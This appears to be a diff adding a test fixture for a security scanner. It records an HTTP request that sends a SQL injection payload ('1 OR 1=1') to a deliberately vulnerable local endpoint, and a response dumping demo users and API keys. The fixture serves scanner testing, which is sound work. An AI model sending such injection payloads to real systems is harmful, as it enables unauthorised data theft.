@@ -1,0 +1,5 @@
+{
+  "request": "POST /vuln/sqli HTTP/1.1\r\nHost: 127.0.0.1:8081\r\nUser-Agent: RedScan-Test\r\nContent-Type: application/json\r\nAccept: */*\r\nAuthorization: Bearer demo-token\r\nCookie: sessionid=demo123\r\n\r\n{\"user_id\":\"1 OR 1=1\"}",
+  "response": "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"query\":\"SELECT id, username, email, role, api_key FROM users WHERE id = 1 OR 1=1\",\"rows\":[{\"id\":1,\"username\":\"alice\",\"email\":\"alice@example.com\",\"role\":\"user\",\"api_key\":\"ak_alice_dev_123\"},{\"id\":2,\"username\":\"bob\",\"email\":\"bob@example.com\",\"role\":\"user\",\"api_key\":\"ak_bob_dev_456\"},{\"id\":3,\"username\":\"admin\",\"email\":\"admin@example.com\",\"role\":\"admin\",\"api_key\":\"ak_admin_root_999\"}]}",
+  "base_url": "http://127.0.0.1:8081"
+}
